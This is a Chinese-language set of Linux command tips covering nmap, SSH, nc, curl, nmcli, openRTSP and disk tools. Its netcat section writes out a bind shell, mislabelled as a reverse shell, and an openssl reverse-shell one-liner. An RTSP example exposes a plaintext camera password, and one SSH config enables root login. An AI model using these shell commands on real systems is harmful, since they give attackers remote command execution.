## 简介

+ linux系统的常用技巧和方法

## linux 测试指定网段是否存在主机

要测试指定网段中是否存在主机，你可以使用 `nmap` 命令。`nmap` 是一个网络探测和安全审核工具，可以用来扫描网络上的主机、端口等信息。你可以在 Linux 终端中使用以下命令：

```
nmap -sn 192.168.1.0/24
```

这个命令将扫描 `192.168.1.0/24` 网段中的所有主机，并列出活跃的主机。 `-sn` 选项告诉 `nmap` 不要进行端口扫描，只是简单地检查主机是否在线。你可以将 `192.168.1.0/24` 替换为你要测试的网段。

## linux 安装nmap命令

在大多数 Linux 发行版中，安装 `nmap` 命令非常简单。你只需打开终端，并根据你使用的 Linux 发行版执行相应的安装命令。

- **在 Ubuntu 或 Debian 上**，你可以使用 `apt` 包管理器安装 `nmap`：
  ```
  sudo apt update
  sudo apt install nmap
  ```

- **在 CentOS 或 Fedora 上**，你可以使用 `yum` 包管理器安装 `nmap`：
  ```
  sudo yum install nmap
  ```

- **在其他基于 RPM 包管理的系统上**，你也可以使用 `dnf` 包管理器安装 `nmap`：
  ```
  sudo dnf install nmap
  ```

一旦安装完成，你就可以在终端中使用 `nmap` 命令了。

## ubuntu root ssh 登陆配置

+ 设置root密码
  + sudo passwd root

+ 修改ssh配置文件
  + 安装ssh-server: sudo apt install openssh-server
  + 修改配置文件: sudo vim /etc/ssh/sshd_config
  + 修改配置：
``` bash
 LoginGraceTime 2m
 PermitRootLogin yes
 StrictModes yes
 #MaxAuthTries 6
 #MaxSessions 10
```

+ 重启ssh，使配置生效
  + sudo service ssh restart
  
## ubuntu 安装ping工具

`ping` 工具通常已经预安装在大多数 Ubuntu 发行版中，因此你通常不需要手动安装它。你可以在终端中直接使用 `ping` 命令来测试网络连接。

打开终端，然后输入以下命令以使用 `ping`：

```bash
ping <目标主机或IP地址>
```

将 `<目标主机或IP地址>` 替换为你要测试连接的目标主机的域名或IP地址。例如：

```bash
ping google.com
```

如果你发现 `ping` 命令不可用，你可以尝试使用以下命令安装它：

```bash
sudo apt update
sudo apt install iputils-ping
```

这将使用 `apt` 包管理器来安装 `iputils-ping` 软件包，其中包括 `ping` 命令。一旦安装完成，你就可以使用 `ping` 命令了。

请注意，对于最新的 Ubuntu 版本，`ping` 工具通常是默认安装的，因此你无需手动安装。

## linux 查看线程占用资源

要查看Linux系统中线程的资源占用情况，你可以使用一些工具和命令来获取相关信息。以下是一些方法：

1. 使用top命令：
   `top`命令是一个终端工具，可以用于实时监视系统的资源使用情况，包括进程和线程。要查看线程的信息，可以按下`H`键，这将切换为线程模式，然后你将看到每个线程的资源占用情况。

2. 使用htop命令：
   `htop`是一个交互式的顶层替代工具，它可以更方便地查看系统资源使用情况，包括线程。你可以在终端中运行`htop`，然后按下`H`键，以查看线程列表。

3. 使用ps命令：
   `ps`命令可以用于列出当前系统中的进程和线程。要显示线程信息，可以运行以下命令：
   ```bash
   ps -eLf
   ```

4. 使用pidstat命令：
   `pidstat`命令可以用于显示进程和线程的资源使用情况统计。要查看线程的资源使用情况，可以运行以下命令：
   ```bash
   pidstat -t
   ```

5. 使用top命令的扩展选项：
   `top`命令还支持一些扩展选项，如`-H`，可以直接启动top时切换到线程模式：
   ```bash
   top -H
   ```

以上这些命令和工具可以帮助你查看Linux系统中线程的资源占用情况，选择其中一个适合你的需求即可。

## ubuntu apt 升级指定安装包

+ 方法一
```bash
apt install --only-upgrade <packagename>
```

+ 方法二
```bash
apt install <packagename>
```

## linux killall 命令未找到

如果在 Linux 终端上执行 `killall` 命令时未找到该命令，可能有以下几种可能原因：

1. **命令不存在**：`killall` 命令不是所有 Linux 发行版都默认安装的。某些发行版可能没有包含这个命令，或者可能不在系统的 PATH 路径中。您可以尝试使用 `which` 命令检查是否存在 `killall` 命令，以及它的路径。

   ```bash
   which killall
   ```

   如果 `which` 命令没有返回路径，说明系统中没有安装 `killall`。

2. **权限问题**：如果您没有足够的权限来执行 `killall` 命令，可能会导致命令未找到。请确保您具有足够的权限来执行此命令。

3. **未安装相关软件包**：在某些发行版中，`killall` 命令可能需要额外的软件包才能使用。您可以尝试安装 `psmisc` 软件包，它包含了 `killall` 命令。

   在 Debian/Ubuntu 系统中，您可以使用以下命令安装 `psmisc`：

   ```bash
   sudo apt-get install psmisc
   ```

   在 Red Hat/CentOS 系统中，您可以使用以下命令安装 `psmisc`：

   ```bash
   sudo yum install psmisc
   ```

   安装完成后，`killall` 命令应该可用了。

如果以上步骤仍然无法解决问题，可能需要查看系统设置或与系统管理员联系，以了解有关命令可用性的更多信息。

## ubuntu 查看CPU架构

要查看 Ubuntu 系统的 CPU 架构，你可以使用以下几种方法：

1. 使用 `lscpu` 命令：

   打开终端，然后输入以下命令并按 Enter：

   ```bash
   lscpu
   ```

   这将显示有关 CPU 的详细信息，包括架构、核心数、线程数等。

2. 使用 `uname` 命令：

   另一种方法是使用 `uname` 命令，如下所示：

   ```bash
   uname -m
   ```

   这将只显示 CPU 的架构信息，例如 x86_64（64 位）或 i686（32 位）。

3. 使用 `arch` 命令：

   还可以使用 `arch` 命令来获取系统的 CPU 架构信息，如下所示：

   ```bash
   arch
   ```

   这将直接显示 CPU 架构。

通过上述方法之一，你可以轻松地查看 Ubuntu 系统的 CPU 架构信息。

## linux 动态库 查看符号链接

在Linux系统中，你可以使用一些命令来查看动态库以及符号链接。以下是一些常用的命令：

1. **`ldd`命令**：`ldd`命令用于显示一个可执行文件或共享库所依赖的动态链接库。你可以在终端中输入以下命令来使用它：

   ```bash
   ldd /path/to/your/executable_or_shared_library
   ```

   这将列出与给定可执行文件或共享库相关联的动态链接库。

2. **`nm`命令**：`nm`命令用于列出共享库或可执行文件中的符号。你可以在终端中输入以下命令来使用它：

   ```bash
   nm /path/to/your/shared_library
   ```

   如果你要查看符号链接，可以在`nm`命令后面加上`-D`选项：

   ```bash
   nm -D /path/to/your/shared_library
   ```

   这将显示共享库中的所有动态符号。

3. **`readelf`命令**：`readelf`命令是一个更强大的工具，用于显示ELF（可执行和链接格式）文件的信息，包括共享库和可执行文件。你可以使用以下命令来查看共享库的符号：

   ```bash
   readelf -s /path/to/your/shared_library
   ```

   这将列出共享库中的符号表。

4. **`objdump`命令**：`objdump`命令也可以用来查看二进制文件的信息，包括符号。以下是一个示例命令：

   ```bash
   objdump -T /path/to/your/shared_library
   ```

   这将显示共享库中的动态符号表。

要注意的是，上述命令中的路径应该替换为你实际的共享库或可执行文件的路径。

如果你想要查看一个符号链接所指向的实际文件，可以使用`ls`命令，例如：

```bash
ls -l /path/to/your/symlink
```

这将显示符号链接指向的实际文件路径。

## nc 使用技巧

Netcat（`nc`）是一个非常强大且灵活的工具，可以用于各种网络连接、数据传输和调试任务。以下是一些在使用 Netcat 时的一些技巧和用法：

1. **简单聊天：**
   Netcat 可以用于在终端之间进行简单的聊天，如下所示：

   在一台机器上启动监听模式：
   ```bash
   nc -l <port>
   ```

   在另一台机器上与其进行连接：
   ```bash
   nc <hostname> <port>
   ```

2. **文件传输：**
   使用 Netcat 可以在两台计算机之间传输文件。在发送端运行 `nc` 命令，而在接收端使用 `nc` 命令监听端口并保存传输的数据，如下所示：

   发送文件：
   ```bash
   nc -w 3 <receiver_ip> <port> < file_to_send
   ```

   接收文件：
   ```bash
   nc -l <port> > received_file
   ```

3. **反向 shell：**
   使用 Netcat 可以创建反向 shell 连接，允许你在远程主机上执行命令，如下所示：

   在目标主机上启动监听模式：
   ```bash
   nc -l -p <port> -e /bin/bash
   ```

   在攻击机上与目标主机建立连接：
   ```bash
   nc <target_ip> <port>
   ```

4. **端口扫描：**
   Netcat 可以用于进行基本的端口扫描，以检查目标主机上的哪些端口是开放的，如下所示：

   扫描前 1000 个端口：
   ```bash
   nc -zv <hostname> 1-1000
   ```

5. **代理和端口转发：**
   Netcat 可以用于创建简单的代理服务器或端口转发，如下所示：

   创建代理服务器：
   ```bash
   nc -l -p <port_to_listen> -c "nc <destination_host> <destination_port>"
   ```

   端口转发：
   ```bash
   nc -l -p <local_port> -c "nc <destination_host> <destination_port>"
   ```

6. **使用 SSL/TLS：**
   可以使用 `openssl` 命令来创建安全的加密连接，以保护数据的传输。例如：
   ```bash
   mkfifo /tmp/ncpipe && /bin/sh -i < /tmp/ncpipe 2>&1 | openssl s_client -quiet -connect <your_ip>:<your_port> > /tmp/ncpipe; rm /tmp/ncpipe
   ```

请谨慎使用 Netcat，确保你了解其功能和用途，以避免滥用或造成安全风险。不同的情况可能需要不同的选项和用法，建议在实际使用之前查阅官方文档和相关资源。

## 查看ubuntu版本

您可以使用以下命令来查看 Ubuntu 系统的版本信息：

1. **查看当前 Ubuntu 版本：**
   ```bash
   lsb_release -a
   ```

   或者

   ```bash
   cat /etc/lsb-release
   ```

   这些命令将显示当前安装的 Ubuntu 发行版的详细信息，包括发行版的代号、版本号和描述。

2. **查看内核版本：**
   若要查看当前正在运行的内核版本，可以使用 `uname` 命令：
   ```bash
   uname -r
   ```

   这将显示当前正在运行的 Linux 内核的版本号。

请注意，命令的输出可能包含一些其他信息，比如发行版的名称、内核的版本以及其他详细信息。确保查看相关输出，以获取您所需的确切版本信息。

## 设置用户的默认目录

在Linux中，要设置用户的默认目录，可以使用用户的配置文件（通常是`.bashrc` 或 `.bash_profile`）来更改用户的起始工作目录。这将使用户在登录时进入指定的目录。

以下是设置用户默认目录的步骤：

1. **确认用户存在：**
   首先，请确保用户已经存在于系统中。您可以使用`id`命令来检查用户是否存在：
   ```bash
   id <username>
   ```
   在这里，`<username>`是要检查的用户名。

2. **选择默认目录：**
   选择您希望将用户设置为默认目录的目录路径。您可以选择任何现有的目录，或者您可以创建一个新的目录。

3. **编辑用户配置文件：**
   对于大多数Linux发行版的bash用户，默认配置文件是 `.bashrc`。对于登录shell，如通过SSH登录的用户，也可以使用 `.bash_profile`。选择合适的配置文件来进行更改。

   使用文本编辑器（如`nano`或`vim`）打开用户的配置文件：
   ```bash
   nano ~/.bashrc
   ```

   或者
   ```bash
   nano ~/.bash_profile
   ```

4. **设置默认目录：**
   在打开的配置文件中，添加以下行，将用户的默认目录设置为您选择的目录：
   ```bash
   cd /path/to/your/default/directory
   ```
   在这里，将 `/path/to/your/default/directory` 替换为您希望作为默认目录的实际路径。

5. **保存并应用更改：**
   保存文件并退出文本编辑器。

6. **重新登录：**
   让更改生效，用户需要注销并重新登录。请确保用户退出当前会话并重新登录以使更改生效。

7. **验证更改：**
   登录后，您可以使用以下命令来验证用户当前的工作目录：
   ```bash
   pwd
   ```

   如果输出为您设置的默认目录路径，则表示已成功将用户的默认目录更改为您选择的目录。

请注意：
- 在更改用户的配置文件之前，建议备份文件以防止错误。
- 确保输入正确的目录路径，否则可能会导致登录问题。
- 更改用户的默认目录可能会影响其在系统中的体验，因此请谨慎进行。确保目录是用户需要经常访问的地方。

如果您对更改用户默认目录不确定，或者希望用户保留默认设置，请谨慎执行以上步骤。

## 将用户加入root目录

在Linux中，root目录是文件系统的根目录，通常是表示整个文件系统的最顶层目录，标记为`/`。因为root目录是系统的根，只有超级用户（root用户）有权限直接对其进行修改。一般用户不能直接加入root目录，因为这样会破坏系统的完整性和安全性。

如果您的意思是将用户加入到具有root权限的用户组（通常是`sudo`组），以便普通用户可以使用`sudo`命令来临时获得超级用户权限执行某些特权操作，那么可以通过以下步骤实现：

1. **确认sudo安装：**
   确保`sudo`程序已经安装在系统中。在大多数Linux发行版中，默认情况下，`sudo`是已经安装的。

2. **确认用户存在：**
   首先，请确保要将用户添加到`sudo`组的用户已经存在于系统中。您可以使用`id`命令来检查用户是否存在：
   ```bash
   id <username>
   ```
   在这里，`<username>`是要检查的用户名。

3. **将用户添加到sudo组：**
   在终端中，使用`usermod`命令来将用户添加到`sudo`组。运行以下命令：
   ```bash
   sudo usermod -aG sudo <username>
   ```
   在这里，将`<username>`替换为您要添加到`sudo`组的实际用户名。

   `-aG`选项用于将用户添加到附加组，以确保用户不会被从其他组中删除。

4. **验证更改：**
   添加用户到`sudo`组后，他们可以使用`sudo`命令临时获得超级用户权限。

   用户可以尝试使用`sudo`来运行某个需要root权限的命令，例如：
   ```bash
   sudo ls /root
   ```

   系统将提示用户输入其自己的密码（而不是root密码），以验证他们的身份。验证通过后，用户将可以以超级用户权限执行命令。

请注意：
- 为用户授予`sudo`权限时，请确保仅为信任的用户授予该权限，以防止滥用和安全问题。
- 直接修改root目录的权限或将普通用户设置为root用户的权限是非常危险的，会导致系统完全失去安全性和稳定性。因此，不应该这样做。
- 只有需要执行特权操作时，用户才应该使用`sudo`命令。在正常情况下，应该使用普通用户权限运行大多数命令，以确保系统的安全性。

## du 查看隐藏目录大小

在 Linux 中，你可以使用 `du` 命令来查看隐藏目录（以`.`开头的目录）的大小。`du` 命令用于估算文件和目录的磁盘使用情况，并可以通过递归地对目录进行操作来查看目录及其子目录的大小。

要查看隐藏目录的大小，可以使用以下命令：

```
du -h -d 1 /path/to/directory/.*
```

其中，`/path/to/directory` 是要查看的目录所在的路径。在命令末尾的 `.*` 表示匹配以`.`开头的目录，这样就能够查看隐藏目录的大小。

`-h` 参数用于显示人类可读的格式，以便更容易阅读文件大小，该参数将以KB、MB、GB等单位显示容器大小。`-d 1` 参数用于指定深度，表示只查看当前目录下一级的子目录大小。

如果你想查看所有隐藏目录的详细信息，可以加上 `-a` 参数：

```
du -ah -d 1 /path/to/directory/.*
```

这将列出所有隐藏目录及其大小的详细信息。

请注意，由于隐藏目录通常位于用户家目录或系统目录中，可能需要超级用户权限（使用 `sudo`）才能查看某些隐藏目录的大小。

## scp 指定远程端口号

在 `scp` 命令中，默认使用 SSH 协议进行文件传输，SSH 协议的默认端口号是 22。如果你需要指定远程主机的不同端口号，可以使用 `-P` 参数来指定。

格式如下：

```
scp -P <port> <source> <destination>
```

其中，`<port>` 是你想要指定的远程端口号，`<source>` 是源文件路径，`<destination>` 是目标文件路径。

示例，假设你想将本地的 `example.txt` 文件传输到远程主机 `remote-host` 的 `/tmp` 目录，并且远程 SSH 端口号是 2222，可以执行以下命令：

```
scp -P 2222 example.txt remote-host:/tmp
```

这将使用 SSH 协议将 `example.txt` 文件传输到远程主机的 `/tmp` 目录，并且指定使用 SSH 端口号 2222 进行连接。

## curl 发送body数据

在 Linux 中，可以使用 curl 命令发送包含请求体（body）数据的 HTTP 请求。以下是几种常见的方式来发送 body 数据：

1. **通过命令行参数指定数据**：

```bash
curl -X POST -d 'body_data' http://example.com
```

在上述示例中，使用 `-d` 参数指定了请求体数据为 'body_data'，并使用 `-X POST` 指定了请求方法为 POST。您可以根据需要修改请求方法和请求体数据。

2. **通过文件指定数据**：

```bash
curl -X POST --data-binary @file.txt http://example.com
```

在上述示例中，使用 `--data-binary` 参数指定了要发送的文件为 file.txt，文件中的内容将作为请求体数据发送给服务器。

3. **通过标准输入（stdin）指定数据**：

```bash
echo 'body_data' | curl -X POST -d @- http://example.com
```

在上述示例中，使用 `echo` 命令将数据发送到 curl 的标准输入，并通过 `-d @-` 参数告诉 curl 从标准输入中读取数据作为请求体。

这些是使用 curl 命令在 Linux 发送带有请求体数据的 HTTP 请求的常见方式。根据您的需求和使用场景，选择适合的方式来发送请求体数据。

希望这些示例对您有所帮助！如果您有更多问题，请随时提问。

## curl 建立websocket连接

curl 是一个命令行工具，它主要用于发送 HTTP 请求，并不直接支持建立 WebSocket 连接。然而，您可以使用 curl 的 `--header` 选项自定义请求头来模拟 WebSocket 握手过程，从而与服务器建立一个简单的 WebSocket 连接。请注意，这种方式只适用于简单的 WebSocket 连接，不支持完整的 WebSocket 协议。

以下是一个示例，展示如何使用 curl 建立一个简单的 WebSocket 连接：

```bash
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
  -H "Sec-WebSocket-Version: 13" \
  http://example.com/websocket
```

在上述示例中，`-i` 选项用于输出响应头信息，`-N` 选项用于禁用数据缓冲。通过 `-H` 选项，我们自定义了多个请求头，包括 `Connection`、`Upgrade`、`Sec-WebSocket-Key` 和 `Sec-WebSocket-Version`。其中，`Sec-WebSocket-Key` 的值为 "SGVsbG8sIHdvcmxkIQ=="，`Sec-WebSocket-Version` 的值为 "13"。这些请求头是模拟 WebSocket 握手过程所需的头信息。

需要注意的是，上述方式只是模拟了 WebSocket 握手过程，它并不能处理 WebSocket 协议的数据交换。要实现完整的 WebSocket 功能，通常需要使用专门的 WebSocket 客户端库或编程语言的 WebSocket 库来建立和处理 WebSocket 连接。

如果您需要使用 WebSocket 连接进行数据交换，建议使用专门的 WebSocket 客户端库，如 WebSocket++、Boost.Beast、libwebsockets 等，或使用支持 WebSocket 的编程语言库，如 JavaScript 的 WebSocket API、Python 的 websocket 模块等。

希望这些信息对您有所帮助！如果您有更多问题，请随时提问。

## linux 建立websocket连接的工具

在 Linux 环境下，可以使用一些特定的工具来建立 WebSocket 连接。以下是几个常用的工具：

1. **wscat**: wscat 是一个用于 WebSocket 测试和调试的命令行工具，它提供了建立 WebSocket 连接、发送和接收消息的功能。您可以使用 npm（Node Package Manager）安装 wscat：

   ```bash
   npm install -g wscat
   ```

   安装完成后，可以使用以下命令建立 WebSocket 连接：

   ```bash
   wscat -c ws://example.com
   ```

2. **websocat**: websocat 是一个功能强大的命令行工具，可以用于建立 WebSocket 连接并进行数据交换。它支持 WebSocket 客户端和服务器模式，并提供了各种选项和功能。您可以从其官方网站下载并安装 websocat：https://github.com/vi/websocat

   安装完成后，可以使用以下命令建立 WebSocket 连接：

   ```bash
   websocat ws://example.com
   ```

3. **wsc**: wsc 是另一个用于 WebSocket 测试和调试的命令行工具，类似于 wscat。您可以从其官方网站下载并安装 wsc：https://github.com/danielstjules/wsc

   安装完成后，可以使用以下命令建立 WebSocket 连接：

   ```bash
   wsc -c ws://example.com
   ```

这些工具都提供了在命令行中建立 WebSocket 连接并进行数据交换的功能。您可以根据自己的需求选择适合的工具来建立 WebSocket 连接和测试您的 WebSocket 服务器。

希望这些信息对您有所帮助！如果您有更多问题，请随时提问。

## nmcli 修改指定连接名

要使用 `nmcli` 命令修改指定连接的名称，可以按照以下步骤进行操作：

1. 确定要修改的连接名称：首先，确定你要修改的网络连接的当前名称。你可以使用 `nmcli connection show` 命令查看所有连接的列表和详细信息。

2. 使用 `nmcli connection modify` 命令修改连接名称：运行以下命令来修改指定连接的名称：

   ```bash
   sudo nmcli connection modify <current-connection-name> connection.id <new-connection-name>
   ```

   将 `<current-connection-name>` 替换为当前连接的名称，`<new-connection-name>` 替换为新的连接名称。

   例如，要将名称为 "old-name" 的连接名称修改为 "new-name"，可以使用以下命令：

   ```bash
   sudo nmcli connection modify old-name connection.id new-name
   ```

3. 重新激活连接以使更改生效：运行以下命令以激活已修改的连接：

   ```bash
   sudo nmcli connection up <new-connection-name>
   ```

   将 `<new-connection-name>` 替换为你修改后的新连接名称。

完成上述步骤后，指定的连接将使用新的名称。你可以使用 `nmcli connection show` 命令来验证连接的状态和详细信息。

请注意，这些步骤中的修改仅针对连接的名称。如果你还需要修改其他连接配置（如 IP 地址、子网掩码、默认网关等），请参考先前提供的相关说明。

希望这些步骤对你有帮助！如有更多问题，请随时提问。

## nmcli 修改指定连接的ip

要使用 `nmcli` 命令修改指定连接的 IP 地址，可以按照以下步骤进行操作：

1. 确定要修改的连接名称：首先，确定你要修改的网络连接的名称。你可以使用 `nmcli connection show` 命令查看所有连接的列表和详细信息。

2. 使用 `nmcli connection modify` 命令修改连接配置：运行以下命令来修改指定连接的 IP 地址配置：

   ```bash
   sudo nmcli connection modify <connection-name> ipv4.method manual ipv4.addresses <ip-address>/<subnet-mask> ipv4.gateway <gateway-address> ipv4.dns <dns-server>
   ```

   在上述命令中，将 `<connection-name>` 替换为要修改的连接名称，`<ip-address>` 替换为新的 IP 地址，`<subnet-mask>` 替换为新的子网掩码，`<gateway-address>` 替换为新的默认网关的 IP 地址，`<dns-server>` 替换为新的 DNS 服务器的 IP 地址。

   例如，要将连接名称为 "eth0" 的连接配置为使用静态 IP 地址 "192.168.1.100/24"，默认网关为 "192.168.1.1"，DNS 服务器为 "8.8.8.8"，可以使用以下命令：

   ```bash
   sudo nmcli connection modify eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8
   ```

3. 激活连接以使更改生效：运行以下命令以激活已修改的连接：

   ```bash
   sudo nmcli connection up <connection-name>
   ```

   将 `<connection-name>` 替换为你修改的连接的名称。

完成上述步骤后，指定的连接将使用新的 IP 地址、子网掩码、默认网关和 DNS 服务器进行配置。你可以使用 `nmcli connection show` 命令来验证连接的状态和详细信息。

请注意，这些步骤假定你已经知道要使用的新的 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。

希望这些步骤对你有帮助！如有更多问题，请随时提问。

## NetworkManager 配置静态IP

在 Debian 系统中使用 NetworkManager 配置静态 IP 地址，可以通过以下步骤进行操作：

1. 确保 NetworkManager 安装和运行：首先，确保你的系统已安装 NetworkManager，并且 NetworkManager 服务正在运行。如果没有安装，你可以使用以下命令安装 NetworkManager：

   ```bash
   sudo apt update
   sudo apt install network-manager
   ```

2. 打开 NetworkManager 配置文件：使用文本编辑器打开 NetworkManager 的主要配置文件 `/etc/NetworkManager/NetworkManager.conf`：

   ```bash
   sudo nano /etc/NetworkManager/NetworkManager.conf
   ```

3. 确认 `managed` 选项的值：在配置文件中找到 `managed` 选项，并确保其值为 `true`。这将告诉 NetworkManager 管理所有网络接口的配置。

   ```ini
   [main]
   plugins=ifupdown,keyfile

   [ifupdown]
   managed=true
   ```

4. 创建一个新的网络连接：使用 `nmcli` 命令创建一个新的网络连接，并指定连接的类型、名称和设备。

   ```bash
   sudo nmcli connection add type ethernet con-name <connection-name> ifname <interface-name> ipv4.method manual ipv4.addresses <ip-address>/<subnet-mask> ipv4.gateway <gateway-address> ipv4.dns <dns-server>
   ```

   在上述命令中，将 `<connection-name>` 替换为连接的名称，`<interface-name>` 替换为网络接口的名称（如 eth0、enp0s3 等），`<ip-address>` 替换为静态 IP 地址，`<subnet-mask>` 替换为子网掩码，`<gateway-address>` 替换为默认网关的 IP 地址，`<dns-server>` 替换为 DNS 服务器的 IP 地址。

   例如，创建名为 "static-eth0" 的静态以太网连接，IP 地址为 "192.168.1.100/24"，默认网关为 "192.168.1.1"，DNS 服务器为 "8.8.8.8"，可以使用以下命令：

   ```bash
   sudo nmcli connection add type ethernet con-name static-eth0 ifname eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8
   ```

5. 激活静态连接：使用 `nmcli` 命令激活刚创建的静态连接。

   ```bash
   sudo nmcli connection up <connection-name>
   ```

   将 `<connection-name>` 替换为之前创建的静态连接的名称。

完成上述步骤后，NetworkManager 将使用你指定的静态 IP 地址、子网掩码、默认网关和 DNS 服务器配置网络接口。你可以使用 `nmcli connection show` 命令来查看连接状态和详细信息。

请注意，这些步骤假定你已经知道要使用的静态 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。

希望这些步骤能帮助你成功配置静态 IP 地址！如有更多问题，请随时提问。

## openRTSP 录制视频

在 Linux 上使用 OpenRTSP 工具录制视频，你可以使用以下命令：

```bash
openRTSP -4 -D <duration> -F <output_file> <RTSP_URL>

openRTSP  -b 5000000 -D 0 -F ./0715.mp4 rtsp://admin:a1234567@192.169.7.125:554
```

解释一下这些参数的含义：
- `-b`: 设置文件输出缓冲区
- `-4`: 强制使用 IPv4 进行通信。
- `-D <duration>`: 指定录制的时长（以秒为单位）。你可以设置具体的录制时间，或使用 `-D 0` 来录制直到手动停止。
- `-F <output_file>`: 指定输出文件的路径和文件名。例如，`/path/to/output.mp4`。
- `<RTSP_URL>`: RTSP 服务器的 URL，指定要录制的流的位置。

示例命令如下：

```bash
openRTSP -4 -D 60 -F /path/to/output.mp4 rtsp://example.com/live/stream
```

这将从指定的 RTSP URL 开始录制视频，并将其保存到指定的输出文件中。录制时长为 60 秒。

请注意，OpenRTSP 工具会尝试从 RTSP 服务器获取媒体流并将其保存为文件。确保你具有从服务器获取流的权限，并且服务器正确配置以提供流媒体数据。如果录制的媒体流有加密或其他保护机制，你可能需要提供相应的凭证或密钥。

另外，OpenRTSP 生成的视频文件可能采用 MPEG4 格式进行编码，你可以使用适当的视频播放器或转码工具来播放或转换录制的视频文件。

## linux 资源监控 第三方工具

在Linux系统上，有许多第三方工具可以用于资源监控。以下是一些常用的推荐工具：

1. **top**: `top` 是一个基本的命令行工具，用于实时监控系统的进程活动和资源使用情况。它显示了CPU使用率、内存使用情况、进程列表等信息，并按照CPU使用率进行排序。

2. **htop**: `htop` 是 `top` 命令的增强版本，提供了更直观的界面和更多的功能。它支持鼠标交互，并提供了更详细的系统信息和进程管理选项。

3. **nmon**: `nmon` 是一个全面的系统监控工具，可以提供对CPU、内存、磁盘、网络等各个方面的实时数据监测和报告。它以交互式的方式显示系统状态，并可以生成历史数据报告供后续分析。

4. **Glances**: `Glances` 是一个跨平台的系统监控工具，提供了实时的系统信息和性能指标。它以终端界面形式展示，支持多种插件和扩展，可以监控CPU、内存、磁盘、网络、传感器等方面的数据。

5. **sar**: `sar`（System Activity Reporter）是一个强大的系统性能监测工具，可以收集并报告系统的各种资源使用情况。它可以生成详细的报告，包括CPU使用率、内存使用情况、磁盘IO、网络流量等指标。

6. **iftop**: `iftop` 是一个网络流量监控工具，可以实时显示网络接口的流量使用情况。它以交互式的方式展示流量信息，并按流量大小排序。

这些工具都提供了不同层次的资源监控和系统性能分析功能。根据你的需求和个人喜好，选择适合你的工具进行资源监控。

---

## 进程分离到后台

在 Linux 中，您可以通过多种方式将进程启动并分离到后台运行。下面介绍两种常见的方法：

1. 使用 "&" 符号：在命令行中启动进程时，可以在命令的末尾添加 "&" 符号。这将使进程在后台运行，而不会阻塞当前终端。例如：

   ```
   ./myprocess &
   ```

   上述命令将名为 "myprocess" 的可执行文件启动为后台进程。

   请注意，当使用该方法启动进程后，终端可能仍然会显示一些输出信息。为了完全将进程与终端分离，可以将进程的标准输入、输出和错误重定向到其他地方，如 `/dev/null`。例如：

   ```
   ./myprocess > /dev/null 2>&1 &
   ```

   上述命令将进程的输出和错误都重定向到 `/dev/null`，这样进程就不会在终端上产生任何输出。

2. 使用 nohup 命令：另一种方法是使用 nohup 命令。nohup 命令可以在后台运行进程，并将其与终端完全分离。使用 nohup 命令的基本语法如下：

   ```
   nohup command &
   ```

   例如，要在后台运行名为 "myprocess" 的可执行文件，可以执行以下命令：

   ```
   nohup ./myprocess &
   ```

   使用 nohup 命令启动的进程会将标准输出和标准错误输出重定向到一个名为 "nohup.out" 的文件中。如果您不希望生成 "nohup.out" 文件，可以将输出重定向到 `/dev/null`，如下所示：

   ```
   nohup ./myprocess > /dev/null 2>&1 &
   ```

   这样可以将进程的输出完全丢弃，而不会写入文件。

使用上述方法之一启动进程并将其分离到后台后，您可以关闭终端，进程将继续在后台运行。请注意，分离到后台的进程仍然与父进程（通常是 init 进程）相关联，但不再与当前终端会话相关联。

---

## 查看目录下的文件数量

要查看Linux系统中目录下的文件数量，可以使用`ls`命令结合一些选项和管道操作来实现。下面是一些常用的方法：

1. 使用`ls`命令的`-l`选项来列出目录中的文件详细信息，并将结果通过管道传递给`wc`命令统计行数。由于`ls`命令会列出文件和子目录，因此需要减去1来排除目录本身。

   ```bash
   ls -l <directory> | grep "^-" | wc -l
   ```

   将`<directory>`替换为要查看的目录路径。

2. 使用`find`命令递归地查找目录下的所有文件，并将结果通过管道传递给`wc`命令统计行数。

   ```bash
   find <directory> -type f | wc -l
   ```

   将`<directory>`替换为要查看的目录路径。

这些方法可以帮助您统计目录下的文件数量。请注意，这些方法只会计算目录中的文件数量，不包括子目录。如果要包括子目录中的文件数量，请使用递归选项。

希望这对您有所帮助。如有其他问题，请随时提问。

---

## ifconfig 配置指定网口ip

要使用`ifconfig`命令配置指定网口的IP地址，请按照以下步骤操作：

1. 打开终端并使用root权限或sudo命令切换到管理员身份。

2. 使用以下命令查看当前可用的网络接口列表：

   ```bash
   ifconfig -a
   ```

   在列表中找到您要配置IP地址的网络接口名称。通常以`eth0`、`eth1`、`enp0sX`或类似的形式命名。

3. 使用以下命令设置指定网口的IP地址：

   ```bash
   ifconfig <interface> <ip_address> netmask <netmask>
   ```

   将`<interface>`替换为您要配置IP地址的网络接口名称，`<ip_address>`替换为您想要设置的IP地址，`<netmask>`替换为子网掩码。

   例如，如果要将`eth0`接口的IP地址设置为`192.168.0.10`，子网掩码为`255.255.255.0`，则命令如下：

   ```bash
   ifconfig eth0 192.168.0.10 netmask 255.255.255.0
   ```

4. 验证IP地址是否已成功设置。使用以下命令检查指定网口的IP地址：

   ```bash
   ifconfig <interface>
   ```

   将`<interface>`替换为您配置IP地址的网络接口名称。

请注意，使用`ifconfig`命令配置的IP地址是临时的，重启系统后将失效。如果您想要永久配置静态IP地址，请参考之前提供的方法，编辑网络配置文件并应用配置。

希望这对您有所帮助。如有其他问题，请随时提问。

## 获取磁盘信息

在Linux中，可以使用一些命令来获取磁盘信息。以下是几个常用的命令：

1. df命令：用于显示文件系统的磁盘空间使用情况。
   ```
   df -h
   ```
   该命令将显示每个文件系统的总容量、已使用空间、可用空间以及挂载点。

2. du命令：用于查看文件和目录的磁盘使用情况。
   ```
   du -sh <目录路径>
   ```
   该命令将显示指定目录的总大小。

3. lsblk命令：用于列出块设备信息，包括硬盘、分区和挂载点。
   ```
   lsblk
   ```
   该命令将显示系统中的块设备列表，包括设备名称、大小、类型等。

4. fdisk命令：用于查看磁盘分区表信息。
   ```
   sudo fdisk -l
   ```
   该命令将显示系统上的磁盘分区信息，包括磁盘设备名称、分区大小、类型等。

